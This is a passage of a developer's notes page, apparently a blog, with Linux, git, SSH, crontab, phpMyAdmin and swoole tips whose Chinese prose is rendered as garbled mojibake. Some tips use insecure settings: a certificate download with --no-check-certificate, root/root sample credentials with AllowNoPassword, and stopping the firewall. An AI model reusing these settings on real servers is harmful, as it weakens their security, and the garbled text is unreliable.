class="comment">//learnku.com/articles/37298</span></span><br></pre></td></tr></table></figure>
<h3 id="crontab-æˆªæ–­"><a href="#crontab-æˆªæ–­" class="headerlink" title="crontab %æˆªæ–­"></a>crontab %æˆªæ–­</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="number">0</span> * * * cd /home/vg/odp/log &amp;&amp; mv *<span class="string">`date -d "-10 day" "+%Y%m%d"`</span>* archives</span><br><span class="line">crontabçš„æ‰§è¡Œæƒ…å†µï¼Œlinuxéƒ½ä¼šç»™å¯¹åº”çš„ç”¨æˆ·å‘é‚®ä»¶ï¼Œå› æ­¤å¯ä»¥é€šè¿‡é‚®ä»¶æ¥å®šä½é—®é¢˜ã€‚ä¸Šé¢çš„ä»»åŠ¡åœ¨vgç”¨æˆ·ä¸‹ï¼ŒæŸ¥çœ‹å¯¹åº”çš„é‚®ä»¶ /<span class="keyword">var</span>/spool/mail/vg</span><br><span class="line">Subjecté‚£ä¸€è¡Œï¼š</span><br><span class="line">Subject: Cron cd /home/vg/odp/log &amp;&amp; mv *<span class="string">`date -d "-10 day" "+</span></span><br><span class="line"><span class="string">æ˜¾ç¤ºçš„å‘½ä»¤ä¸å…¨ï¼Œåˆ°åŠ å·å°±ç»“æŸäº†ï¼Œ%å’Œåé¢çš„éƒ¨åˆ†ä¸¢å¤±äº†ï¼Œç»“åˆæŠ¥é”™åŸºæœ¬å¯ä»¥å®šä½åŸå› ï¼Œ%æ˜¯crontabé‡Œçš„ç‰¹æ®Šç¬¦å·ï¼Œè¡¨ç¤ºæ–°çš„ä¸€è¡Œå¼€å§‹ï¼Œæ‰€ä»¥å‰é¢çš„å‘½ä»¤å°±è¢«æˆªæ–­äº†ã€‚</span></span><br><span class="line"><span class="string">è§£å†³æ–¹å¼</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">å¦‚æœcrontabæ‰§è¡Œçš„å‘½ä»¤ä¸­åŒ…å«%éœ€è¦ç”¨\è½¬ä¹‰ï¼Œä¸Šé¢çš„ä¾‹å­—æ”¹æˆè¿™æ ·å°±å¯ä»¥æˆåŠŸæ‰§è¡Œï¼š</span></span><br><span class="line"><span class="string">0 0 * * * cd /home/vg/odp/log &amp;&amp; mv *`</span>date -d <span class="string">"-10 day"</span> <span class="string">"+\%Y\%m\%d"</span><span class="string">`* archives</span></span><br><span class="line"><span class="string">https://www.daemoncoder.com/a/%E8%AE%B0%E4%B8%80%E6%AC%A1crontab%E4%B8%ADdate%E5%91%BD%E4%BB%A4%E9%94%99%E7%94%A8%E5%AF%BC%E8%87%B4%E7%9A%84%E9%97%AE%E9%A2%98/4d54453d</span></span><br></pre></td></tr></table></figure>
<h3 id="æŸ¥å‡ºè®¿é—®é‡TOP10çš„IP"><a href="#æŸ¥å‡ºè®¿é—®é‡TOP10çš„IP" class="headerlink" title="æŸ¥å‡ºè®¿é—®é‡TOP10çš„IP"></a>æŸ¥å‡ºè®¿é—®é‡TOP10çš„IP</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">æ—¥å¿—æ–‡ä»¶access.logæ ¼å¼å¦‚ä¸‹ï¼š</span><br><span class="line"></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> - - [<span class="number">18</span>/Nov/<span class="number">2018</span>:<span class="number">17</span>:<span class="number">26</span>:<span class="number">54</span> +<span class="number">0800</span>] <span class="string">"GET / HTTP/1.0"</span> <span class="number">200</span> <span class="number">3283</span> <span class="string">"-"</span> <span class="string">""</span> <span class="string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"</span> <span class="number">0.012</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">9000</span> daemoncoder.com <span class="string">"-"</span></span><br><span class="line">Linuxå‘½ä»¤ï¼š</span><br><span class="line"></span><br><span class="line">awk -F <span class="string">" "</span> <span class="string">'&#123;count[$1]++&#125; END &#123;for (i in count) &#123;printf("%s\t%d\n", i, count[i]);&#125;&#125;'</span> access.log | sort -nrk <span class="number">2</span> | head</span><br><span class="line">é€šè¿‡awkå¯¹æ—¥å¿—ä¸­çš„æ¯ä¸€è¡Œipè¿›è¡Œè®¡æ•°ç»Ÿè®¡ï¼Œå¹¶æŒ‰ip countæ ¼å¼è¾“å‡ºã€‚</span><br><span class="line"></span><br><span class="line">é€šè¿‡sortå‘½ä»¤æŒ‰ç…§ç¬¬äºŒåˆ—é™åºæ’åºï¼š-t æŒ‡å®šåˆ†å‰²ç¬¦æ˜¯ç©ºæ ¼; -næŒ‡å®šæŒ‰æ•°å­—å¤§å°æ’åº; -r æŒ‡å®šé™åºè¾“å‡º; -k æŒ‡å®šæŒ‰åˆ†éš”åçš„ç¬¬äºŒåˆ—æ’åº</span><br><span class="line"></span><br><span class="line">é€šè¿‡headå‘½ä»¤å–å‡ºå‰åæ¡ã€‚https:<span class="comment">//www.daemoncoder.com/a/%E4%B8%80%E8%A1%8CLinux%E5%91%BD%E4%BB%A4%E6%9F%A5%E5%87%BA%E8%AE%BF%E9%97%AE%E9%87%8FTOP10%E7%9A%84IP/4d773d3d</span></span><br></pre></td></tr></table></figure>
<h3 id="phpmyadmin-ç®¡ç†å¤šå°-MySQL"><a href="#phpmyadmin-ç®¡ç†å¤šå°-MySQL" class="headerlink" title="phpmyadmin ç®¡ç†å¤šå° MySQL"></a>phpmyadmin ç®¡ç†å¤šå° MySQL</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">å¤åˆ¶ phpMyAdmin æ ¹ç›®å½•ä¸‹çš„ config.sample.inc.php æ–‡ä»¶ï¼Œé‡å‘½åä¸º config.inc.phpï¼›</span><br><span class="line">åœ¨æ–‡ä»¶ä¸­å®šä¹‰ä½ çš„å¤šå°æœåŠ¡å™¨é…ç½®ä¿¡æ¯ï¼š</span><br><span class="line">$hosts = [</span><br><span class="line">    <span class="number">1</span> =&gt; [<span class="string">'host'</span> =&gt; <span class="string">'localhost'</span>, <span class="string">'user'</span> =&gt; <span class="string">'root'</span>, <span class="string">'password'</span> =&gt; <span class="string">'root'</span>],</span><br><span class="line">    <span class="number">2</span> =&gt; [<span class="string">'host'</span> =&gt; <span class="string">'192.168.10.10'</span>, <span class="string">'user'</span> =&gt; <span class="string">'homestead'</span>, <span class="string">'password'</span> =&gt; <span class="string">'secret'</span>]</span><br><span class="line">];</span><br><span class="line">åœ¨åŠ å…¥ä»¥ä¸‹ä»£ç ç‰‡æ®µï¼Œé€šè¿‡ <span class="keyword">for</span> å¾ªç¯æ¥è¯»å–å¤šå° MySQL æœåŠ¡å™¨é…ç½®ä¿¡æ¯</span><br><span class="line"><span class="keyword">for</span>($i = <span class="number">1</span>; $i &lt;= count($hosts); $i++)&#123;</span><br><span class="line">    <span class="comment">/* Authentication type */</span></span><br><span class="line">    $cfg[<span class="string">'Servers'</span>][$i][<span class="string">'auth_type'</span>] = <span class="string">'cookie'</span>;</span><br><span class="line">    <span class="comment">/* Server parameters */</span></span><br><span class="line">    $cfg[<span class="string">'Servers'</span>][$i][<span class="string">'host'</span>] = $hosts[$i][<span class="string">'host'</span>];    <span class="comment">//ä¿®æ”¹host</span></span><br><span class="line">    $cfg[<span class="string">'Servers'</span>][$i][<span class="string">'connect_type'</span>] = <span class="string">'tcp'</span>;</span><br><span class="line">    $cfg[<span class="string">'Servers'</span>][$i][<span class="string">'compress'</span>] = <span class="literal">false</span>;</span><br><span class="line">    <span class="comment">/* Select mysqli if your server has it */</span></span><br><span class="line">    $cfg[<span class="string">'Servers'</span>][$i][<span class="string">'extension'</span>] = <span class="string">'mysql'</span>;</span><br><span class="line">    $cfg[<span class="string">'Servers'</span>][$i][<span class="string">'AllowNoPassword'</span>] = <span class="literal">true</span>;</span><br><span class="line">    $cfg[<span class="string">'Servers'</span>][$i][<span class="string">'user'</span>] = $hosts[$i][<span class="string">'user'</span>];    <span class="comment">//ä¿®æ”¹ç”¨æˆ·å</span></span><br><span class="line">    $cfg[<span class="string">'Servers'</span>][$i][<span class="string">'password'</span>] = $hosts[$i][<span class="string">'password'</span>];    <span class="comment">//å¯†ç </span></span><br><span class="line">&#125;</span><br><span class="line">https:<span class="comment">//learnku.com/articles/31740</span></span><br></pre></td></tr></table></figure>
<h3 id="pull-requestæµç¨‹"><a href="#pull-requestæµç¨‹" class="headerlink" title="pull requestæµç¨‹"></a>pull requestæµç¨‹</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">åœ¨ GitHub ä¸ŠæŠŠæœ¬é¡¹ç›® fork åˆ°è‡ªå·±çš„ä»“åº“ï¼Œå¦‚ &lt;your-username&gt;<span class="regexp">/php-developer-preparesï¼Œç„¶å clone åˆ°æœ¬åœ°ï¼Œå¹¶è®¾ç½®ç”¨æˆ·ä¿¡æ¯ã€‚</span></span><br><span class="line"><span class="regexp">$ git clone git@github.com:&lt;your-username&gt;/</span>php-developer-prepares.git</span><br><span class="line">$ cd php-developer-prepares</span><br><span class="line">$ git config user.name <span class="string">"yourname"</span></span><br><span class="line">$ git config user.email <span class="string">"your email"</span></span><br><span class="line">ä¿®æ”¹ä»£ç åæäº¤ï¼Œå¹¶æ¨é€åˆ°è‡ªå·±çš„ä»“åº“ã€‚</span><br><span class="line">$ #do some change on the content</span><br><span class="line">$ git commit -am <span class="string">"Fix issue #1: change helo to hello"</span></span><br><span class="line">$ git push</span><br><span class="line">åœ¨ GitHub ç½‘ç«™ä¸Šæäº¤ pull requestã€‚</span><br><span class="line">å®šæœŸä½¿ç”¨é¡¹ç›®ä»“åº“å†…å®¹æ›´æ–°è‡ªå·±ä»“åº“å†…å®¹ã€‚</span><br><span class="line">$ git remote add upstream https:<span class="comment">//github.com/zacao/php-developer-prepares</span></span><br><span class="line">$ git fetch upstream</span><br><span class="line">$ git checkout master</span><br><span class="line">$ git rebase upstream/master</span><br><span class="line">$ git push -f origin master</span><br></pre></td></tr></table></figure>
<h3 id="SSH-ä¹Ÿé€šè¿‡-SS-ä»£ç†"><a href="#SSH-ä¹Ÿé€šè¿‡-SS-ä»£ç†" class="headerlink" title="SSH ä¹Ÿé€šè¿‡ SS ä»£ç†"></a>SSH ä¹Ÿé€šè¿‡ SS ä»£ç†</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> é…ç½®æ‚¨çš„ ~<span class="regexp">/.ssh/</span>config æ–‡ä»¶ï¼Œå¢åŠ ä»¥ä¸‹çš„å†…å®¹å³å¯ï¼š</span><br><span class="line"></span><br><span class="line">Host github.com</span><br><span class="line">   HostName github.com</span><br><span class="line">   User git</span><br><span class="line">   ProxyCommand nc -v -x <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">1086</span> %h %p</span><br><span class="line">https:<span class="comment">//learnku.com/articles/37108</span></span><br></pre></td></tr></table></figure>
<h3 id="Github-å…³é”®å­—è¿›è¡Œæœç´¢"><a href="#Github-å…³é”®å­—è¿›è¡Œæœç´¢" class="headerlink" title="Github å…³é”®å­—è¿›è¡Œæœç´¢"></a>Github å…³é”®å­—è¿›è¡Œæœç´¢</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">in</span>:name Laravel</span><br><span class="line"><span class="keyword">in</span>:readme Laravel</span><br><span class="line"><span class="keyword">in</span>:decription Laravel</span><br><span class="line"><span class="keyword">in</span>:description Laravel stars:&gt;<span class="number">1000</span> forks:&gt;<span class="number">1000</span></span><br><span class="line"><span class="keyword">in</span>:descrption Laravel stars:<span class="number">1000.</span><span class="number">.2000</span></span><br><span class="line"><span class="keyword">in</span>:description éªŒè¯ç  language:php</span><br><span class="line">in:description éªŒè¯ç  language:php pushed:&gt;2019-05-01 # è¿‡æ»¤å¤§äº 2019-05-01ä¹‹åæäº¤çš„</span><br><span class="line">in:description éªŒè¯ç  language:php created:&gt;2019-05-01 # è¿‡æ»¤å¤§äº 2019-05-01åˆ›å»ºçš„</span><br><span class="line">user:overtrue</span><br><span class="line">user:laravel</span><br><span class="line">https:<span class="comment">//learnku.com/articles/38106 https://github.com/search/advanced</span></span><br><span class="line">followers:&gt;<span class="number">1000</span> language:PHP location:China</span><br></pre></td></tr></table></figure>
<h3 id="Bash-å•å‘½ä»¤è¡Œè§£é‡Š"><a href="#Bash-å•å‘½ä»¤è¡Œè§£é‡Š" class="headerlink" title="Bash å•å‘½ä»¤è¡Œè§£é‡Š"></a>Bash å•å‘½ä»¤è¡Œè§£é‡Š</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">æ¸…ç©ºæ–‡ä»¶  &gt; file</span><br><span class="line"> echo <span class="string">"some string"</span> &gt; file</span><br><span class="line"> echo <span class="string">"foo bar baz"</span> &gt;&gt; file</span><br><span class="line"> line=$(head <span class="number">-1</span> file)</span><br><span class="line"> line=<span class="string">`head -1 file`</span> </span><br><span class="line"> ä¸€è¡Œè¡Œåœ°è¯»å–æ–‡ä»¶ </span><br><span class="line"> </span><br><span class="line"> $ <span class="keyword">while</span> read -r line; <span class="keyword">do</span></span><br><span class="line">     # do something with $line</span><br><span class="line"> done &lt; file</span><br><span class="line"> </span><br><span class="line"> $ str=<span class="string">"hello world"</span></span><br><span class="line"> $ echo $&#123;<span class="attr">str</span>:<span class="number">6</span>&#125;<span class="comment">//world</span></span><br><span class="line"> echo $&#123;<span class="attr">str</span>:<span class="number">7</span>:<span class="number">2</span>&#125;</span><br><span class="line"> echo $&#123;#str&#125;//12</span><br><span class="line"> $ <span class="keyword">if</span> [[ $str =~ [<span class="number">0</span><span class="number">-9</span>]+.[<span class="number">0</span><span class="number">-9</span>]+ ]]; then</span><br><span class="line">     # æ‰§è¡Œä¸€äº›æ“ä½œ</span><br><span class="line"> fi</span><br><span class="line"> $ <span class="keyword">if</span> [[ $file = *.zip ]]; then</span><br><span class="line">     # æ‰§è¡Œä¸€äº›æ“ä½œ</span><br><span class="line"> fi</span><br><span class="line"> $ <span class="keyword">if</span> [[ $answer = [Yy]* ]]; then</span><br><span class="line">     # æ‰§è¡Œä¸€äº›æ“ä½œ</span><br><span class="line"> fi</span><br><span class="line"> $ str=baz-foo-bar-foo-foo</span><br><span class="line"> $ echo $&#123;str/foo/bar&#125;</span><br><span class="line"> baz-bar-bar-foo-foo</span><br><span class="line"> $ echo <span class="string">"$x$y"</span><span class="comment">//åˆå¹¶</span></span><br><span class="line"> $ echo foo&#123;,,,,,,,,,,&#125;<span class="comment">//é‡å¤ç”Ÿæˆ</span></span><br><span class="line"> echo &#123;a,b,c&#125;&#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line"> a1 a2 a3 b1 b2 b3 c1 c2 c3</span><br><span class="line">printf <span class="string">"%02d "</span> &#123;<span class="number">0.</span><span class="number">.9</span>&#125;<span class="comment">//00 01 02 03 04 05 06 07 08 09</span></span><br><span class="line">echo &#123;<span class="number">1.</span><span class="number">.100</span>&#125;</span><br><span class="line">$ echo &#123;a..z&#125;<span class="comment">//a b c d e f g h i j k l m n o p q r s t u v w x y z</span></span><br><span class="line">echo $(printf <span class="string">"%c"</span> &#123;a..z&#125;)</span><br><span class="line">abcdefghijklmnopqrstuvwxyz</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//learnku.com/articles/38528</span></span><br><span class="line"> https:<span class="comment">//learnku.com/articles/38449</span></span><br></pre></td></tr></table></figure>
<h3 id="åˆ—å‡ºç›®å½•ä¸‹æ‰€æœ‰è¢«-git-å¿½ç•¥çš„æ–‡ä»¶"><a href="#åˆ—å‡ºç›®å½•ä¸‹æ‰€æœ‰è¢«-git-å¿½ç•¥çš„æ–‡ä»¶" class="headerlink" title="åˆ—å‡ºç›®å½•ä¸‹æ‰€æœ‰è¢« git å¿½ç•¥çš„æ–‡ä»¶"></a>åˆ—å‡ºç›®å½•ä¸‹æ‰€æœ‰è¢« git å¿½ç•¥çš„æ–‡ä»¶</h3><p>find . -type f  | git check-ignore â€“stdin</p>
<h3 id="SSH-é—²ç½®æ—¶é—´è¿‡é•¿è€Œæ–­å¼€"><a href="#SSH-é—²ç½®æ—¶é—´è¿‡é•¿è€Œæ–­å¼€" class="headerlink" title="SSH é—²ç½®æ—¶é—´è¿‡é•¿è€Œæ–­å¼€"></a>SSH é—²ç½®æ—¶é—´è¿‡é•¿è€Œæ–­å¼€</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//  ä¿®æ”¹/etc/ssh/sshd_configé…ç½®æ–‡ä»¶ï¼Œæ‰¾åˆ°ClientAliveCountMaxï¼ˆå•ä½ä¸ºåˆ†é’Ÿï¼‰ä¿®æ”¹ä½ æƒ³è¦çš„å€¼ï¼Œ</span></span><br><span class="line"><span class="comment">//   æ‰§è¡Œ</span></span><br><span class="line">$ service sshd reload </span><br><span class="line"></span><br><span class="line"><span class="comment">//  æ‰¾åˆ°æ‰€åœ¨ç”¨æˆ·çš„.sshç›®å½•,å¦‚rootç”¨æˆ·è¯¥ç›®å½•åœ¨ï¼š</span></span><br><span class="line">$  /root/.ssh/</span><br><span class="line"><span class="comment">//  åœ¨è¯¥ç›®å½•åˆ›å»ºconfigæ–‡ä»¶</span></span><br><span class="line">$ vi /root/.ssh/config</span><br><span class="line"><span class="comment">//  åŠ å…¥ä¸‹é¢ä¸€å¥ï¼š</span></span><br><span class="line">ServerAliveInterval <span class="number">60</span></span><br><span class="line"><span class="comment">//  ä¿å­˜é€€å‡ºï¼Œé‡æ–°å¼€å¯rootç”¨æˆ·çš„shellï¼Œåˆ™å†sshè¿œç¨‹æœåŠ¡å™¨çš„æ—¶å€™ï¼Œ</span></span><br><span class="line">ä¸ä¼šå› ä¸ºé•¿æ—¶é—´æ“ä½œæ–­å¼€ã€‚åº”è¯¥æ˜¯åŠ å…¥è¿™å¥ä¹‹åï¼Œsshå®¢æˆ·ç«¯ä¼šæ¯éš”ä¸€</span><br><span class="line">æ®µæ—¶é—´è‡ªåŠ¨ä¸sshæœåŠ¡å™¨é€šä¿¡ä¸€æ¬¡ï¼Œæ‰€ä»¥é•¿æ—¶é—´æ“ä½œä¸ä¼šæ–­å¼€ã€‚</span><br><span class="line">https:<span class="comment">//learnku.com/articles/38759</span></span><br><span class="line"><span class="comment">// ä¿®æ”¹/etc/profileé…ç½®æ–‡ä»¶</span></span><br><span class="line">$ vi /etc/profile</span><br><span class="line">å¢åŠ ï¼šTMOUT=<span class="number">1800</span></span><br><span class="line">è¿™æ ·<span class="number">30</span>åˆ†é’Ÿæ²¡æ“ä½œå°±è‡ªåŠ¨LOGOUT</span><br></pre></td></tr></table></figure>
<h3 id="å®‰è£…-swoole-laravelS"><a href="#å®‰è£…-swoole-laravelS" class="headerlink" title="å®‰è£… swoole laravelS"></a>å®‰è£… swoole laravelS</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">pecl install swoole </span><br><span class="line">$ pecl channel-update pecl.php.net</span><br><span class="line">$ php -r <span class="string">"print_r(openssl_get_cert_locations());"</span></span><br><span class="line">[default_cert_file] =&gt; <span class="regexp">/usr/</span>lib/ssl/cert.pem</span><br><span class="line">[default_cert_file_env] =&gt; SSL_CERT_FILE</span><br><span class="line">[default_cert_dir] =&gt; <span class="regexp">/usr/</span>lib/ssl/certs</span><br><span class="line">[default_cert_dir_env] =&gt; SSL_CERT_DIR</span><br><span class="line">[default_private_dir] =&gt; <span class="regexp">/usr/</span>lib/ssl/private</span><br><span class="line">[default_default_cert_area] =&gt; <span class="regexp">/usr/</span>lib/ssl</span><br><span class="line">[ini_cafile] =&gt;</span><br><span class="line">[ini_capath] =&gt;</span><br><span class="line">å®‰è£…è¯ä¹¦</span><br><span class="line">$ wget -c https:<span class="comment">//curl.haxx.se/ca/cacert.pem  /usr/local/openssl/cert.pem --no-check-certificate</span></span><br><span class="line">å¼€å¯ swoole æ‰©å±•</span><br><span class="line">$ echo <span class="string">'extension=swoole.so'</span> &gt;&gt; <span class="regexp">/etc/</span>php/<span class="number">7.3</span>/mods-available/swoole.ini</span><br><span class="line">$  ln -s /etc/php/<span class="number">7.3</span>/mods-available/swoole.ini /etc/php/<span class="number">7.3</span>/cli/conf.d/<span class="number">20</span>-swoole.ini</span><br><span class="line"></span><br><span class="line">https:<span class="comment">//learnku.com/articles/38355</span></span><br></pre></td></tr></table></figure>
<h3 id="error-src-refspec-matches-more-than-one"><a href="#error-src-refspec-matches-more-than-one" class="headerlink" title="error src refspec matches more than one"></a>error src refspec matches more than one</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git push origin test</span><br><span class="line">error: src refspec test matches more than one.</span><br><span class="line">error: failed to push some refs to</span><br><span class="line">git tag |grep test</span><br><span class="line">å› ä¸ºæœ‰ä¸€ä¸ªä¸å½“å‰æäº¤åˆ†æ”¯åŒåçš„æ ‡ç­¾</span><br><span class="line">git tag -d test</span><br><span class="line">git push origin test</span><br></pre></td></tr></table></figure>
<h3 id="ssh-è¿æ¥-å®ç°å…å¯†ç ç™»é™†"><a href="#ssh-è¿æ¥-å®ç°å…å¯†ç ç™»é™†" class="headerlink" title="ssh è¿æ¥ å®ç°å…å¯†ç ç™»é™†"></a>ssh è¿æ¥ å®ç°å…å¯†ç ç™»é™†</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>ä¸»é…ç½®æ–‡ä»¶äº/etc/ssh/sshd_config</span><br><span class="line"><span class="number">2.</span>Port <span class="number">22</span> ç«¯å£å£°æ˜æŒ‡å®šsshdæœåŠ¡å™¨å°†ä¾¦å¬è¿æ¥çš„ç«¯å£ </span><br><span class="line">å¦‚éœ€æ›´æ”¹ç«¯å£ ç›´æ¥æ·»åŠ å  æµ‹è¯•å®Œæˆ å†åˆ é™¤ <span class="number">22</span></span><br><span class="line"><span class="number">3.</span>PermitRootLogin é€‰æ‹©æ˜¯å¦å…è®¸rootç™»å½•</span><br><span class="line"><span class="number">4.</span>LoginGraceTime æŒ‡å®šåœ¨æœªæˆåŠŸç™»å½•çš„æƒ…å†µä¸‹ä¿æŒè¿æ¥æ´»åŠ¨çš„ç§’æ•°</span><br><span class="line">[root@7S ssh]# sudo service ssh restart  é‡å¯æœåŠ¡</span><br><span class="line">[root@7S ssh]# sudo systemctl restart ssh</span><br><span class="line"></span><br><span class="line">[root@7S ssh]# systemctl stop firewalld.service //å…³é—­é˜²ç«å¢™</span><br><span class="line">    [root@7S ssh]# systemctl is-enabled firewalld.service //æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€</span><br><span class="line">    enabled</span><br><span class="line">    [root@7S ssh]# firewall-cmd --zone=public --add-port=1212/tcp --permanent æ·»åŠ  æ”¾è¡Œç«¯å£ 1212</span><br><span class="line">    FirewallD is not running <span class="comment">// é˜²ç«å¢™å…³é—­</span></span><br><span class="line">    [root@7S ssh]# systemctl restart firewalld.service //å¯åŠ¨</span><br><span class="line">    [root@7S ssh]# firewall-cmd --zone=public --add-port=1212/tcp --permanent //ç»§ç»­æ·»åŠ </span><br><span class="line">    success </span><br><span class="line">     [root@7S ssh]# firewall-cmd --zone=public --list-ports //æŸ¥çœ‹æ‰€æœ‰ç«¯å£</span><br><span class="line">[root@7S ssh]# ssh-keygen -t rsa //åˆ›å»º</span><br><span class="line">æŒ‰ Enter é”®æ¥å—é»˜è®¤å€¼  (Mac)å¯†é’¥åœ¨ã€œ/.ssh/id_rsa.pubå’Œã€œ/.ssh / id_rsaä¸­ (<span class="built_in">window</span> ç³»ç»Ÿä¸ä¸€æ · Adminæ–‡ä»¶åä¸ä¸€æ ·) /C/users/Admin/.ssh/id_rsa</span><br><span class="line">ssh-copy-id root@<span class="number">192.168</span><span class="number">.100</span><span class="number">.00</span> <span class="comment">// å°†å…¬é’¥å¤åˆ¶åˆ°è¿œç¨‹æœåŠ¡å™¨ è¾“å…¥å¯†ç  ä¸‹æ¬¡ä¸éœ€è¦ä½¿ç”¨å¯†ç  å³å¯ç™»å½•</span></span><br><span class="line"></span><br><span class="line">æ›´æ”¹ ç«¯å£ ç™»å½•</span><br><span class="line">$ ssh -p <span class="number">1212</span> root@<span class="number">192.168</span><span class="number">.100</span><span class="number">.00</span></span><br><span class="line"></span><br><span class="line">å®‰å…¨è€ƒè™‘ ç¦ç”¨å¯†ç éªŒè¯</span><br><span class="line"></span><br><span class="line">[root@7S ssh]# /etc/ssh/sshd_config</span><br><span class="line"><span class="comment">// PasswordAuthentication no //å»æ‰æ³¨é‡Š æ”¹ä¸º no</span></span><br><span class="line"><span class="comment">// PubkeyAuthentication yes   // é»˜è®¤ä¸ä¿®æ”¹</span></span><br><span class="line"><span class="comment">// ChallengeResponseAuthentication no // é»˜è®¤ä¸ä¿®æ”¹</span></span><br><span class="line">sudo systemctl restart ssh <span class="comment">// é‡å¯æœåŠ¡ å¦‚æœ‰é”™è¯¯ å…³é—­ SELinux 